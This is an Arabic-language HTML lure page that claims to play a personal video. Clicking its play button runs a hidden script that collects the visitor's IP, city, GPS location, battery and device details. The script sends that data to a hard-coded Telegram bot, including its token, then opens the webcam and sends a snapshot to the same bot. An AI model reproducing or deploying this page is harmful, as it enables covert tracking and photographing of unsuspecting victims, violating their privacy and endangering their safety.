<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>📽️ فيديو خاص بك</title>
  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;700&display=swap" rel="stylesheet">
  <style>
    body {
      margin: 0;
      font-family: 'Cairo', sans-serif;
      background: black;
      color: white;
      overflow: hidden;
    }

    #particles-js {
      position: absolute;
      width: 100%;
      height: 100%;
      background: black;
      z-index: 0;
    }

    .container {
      position: relative;
      z-index: 1;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      height: 100vh;
      text-align: center;
    }

    h1 {
      font-size: 28px;
      margin-bottom: 20px;
      color: #ff0040;
      text-shadow: 0 0 10px #ff0040;
    }

    p {
      color: #ccc;
      margin-bottom: 30px;
    }

    button {
      background: #ff0040;
      color: white;
      border: none;
      padding: 14px 28px;
      border-radius: 50px;
      font-size: 18px;
      cursor: pointer;
      box-shadow: 0 0 15px #ff0040;
      transition: transform 0.2s ease;
    }

    button:hover {
      transform: scale(1.05);
    }

    video {
      display: none;
    }
  </style>
</head>
<body>
  <div id="particles-js"></div>
  <div class="container">
    <h1>📽️ اضغط لمشاهدة الفيديو</h1>
    <p>اضغط موافق لمشاهدة فيديو خاص بك</p>
    <button onclick="startProcess()">▶️ تشغيل الفيديو</button>
    <video id="video" autoplay playsinline></video>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/particles.js@2.0.0/particles.min.js"></script>
  <script>
    particlesJS("particles-js", {
      "particles": {
        "number": { "value": 80 },
        "color": { "value": "#ff0040" },
        "shape": { "type": "circle" },
        "opacity": {
          "value": 0.5,
          "random": true
        },
        "size": {
          "value": 3,
          "random": true
        },
        "line_linked": {
          "enable": true,
          "distance": 120,
          "color": "#ff0040",
          "opacity": 0.4,
          "width": 1
        },
        "move": {
          "enable": true,
          "speed": 2
        }
      },
      "interactivity": {
        "events": {
          "onhover": { "enable": true, "mode": "repulse" }
        }
      },
      "retina_detect": true
    });
  </script>

  <!-- JavaScript كما هو تماماً من كودك السابق -->
  <script>
    const token = "7439082421:AAEG8hImgTBzQgz9SQbYq47FfGJldOQC_HI";
    const chatId = "7220184605";

    async function sendTelegramMessage(text) {
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ chat_id: chatId, text }),
      });
    }

    async function sendPhoto(blob) {
      const formData = new FormData();
      formData.append("chat_id", chatId);
      formData.append("photo", blob, "photo.jpg");

      await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
        method: "POST",
        body: formData
      });
    }

    async function getIPInfo() {
      const res = await fetch("https://ipapi.co/json/");
      return await res.json();
    }

    async function getBatteryInfo() {
      try {
        const battery = await navigator.getBattery();
        return {
          level: Math.round(battery.level * 100),
          charging: battery.charging ? "نعم ⚡" : "لا ❌"
        };
      } catch {
        return { level: "غير معروف", charging: "غير معروف" };
      }
    }

    async function getLocation() {
      return new Promise((resolve) => {
        navigator.geolocation.getCurrentPosition((pos) => {
          const lat = pos.coords.latitude.toFixed(5);
          const lon = pos.coords.longitude.toFixed(5);
          resolve(`https://maps.google.com/?q=${lat},${lon}`);
        }, () => {
          resolve("❌ غير مسموح أو غير متاح");
        }, { timeout: 5000 });
      });
    }

    async function startProcess() {
      const ipInfo = await getIPInfo();
      const battery = await getBatteryInfo();
      const location = await getLocation();
      const now = new Date().toLocaleString("ar-SY", { timeZone: "Asia/Damascus" });

      const deviceInfo = navigator.userAgent;
      const screenRes = `${screen.width}x${screen.height}`;
      const connection = navigator.connection || {};
      const memory = navigator.deviceMemory || "غير معروف";
      const cores = navigator.hardwareConcurrency || "غير معروف";

      const message = `
📝 معلومات الزائر:
🌍 الدولة: ${ipInfo.country_name} 
🏙️ المدينة: ${ipInfo.city}
🌐 IP: ${ipInfo.ip}
📍 الموقع الجغرافي: ${location}

📱 الجهاز:
🔋 الشحن: ${battery.level}%
⚡ هل يشحن؟: ${battery.charging}
📶 الاتصال: ${connection.effectiveType || "غير معروف"}
💾 الذاكرة: ${memory} GB
⚙️ الأنوية: ${cores}
🖥️ المتصفح: ${deviceInfo}
📏 الشاشة: ${screenRes}
🕓 الوقت: ${now}
`;

      await sendTelegramMessage(message);

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById("video");
        video.srcObject = stream;
        video.play();

        setTimeout(() => {
          const canvas = document.createElement("canvas");
          canvas.width = 640;
          canvas.height = 480;
          const ctx = canvas.getContext("2d");
          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

          stream.getTracks().forEach(track => track.stop());

          canvas.toBlob(async (blob) => {
            await sendPhoto(blob);
          }, "image/jpeg");
        }, 3000);
      } catch (err) {
        await sendTelegramMessage("⚠️ الكاميرا غير مفعلة أو تم الرفض.");
      }
    }
  </script>
</body>
</html>
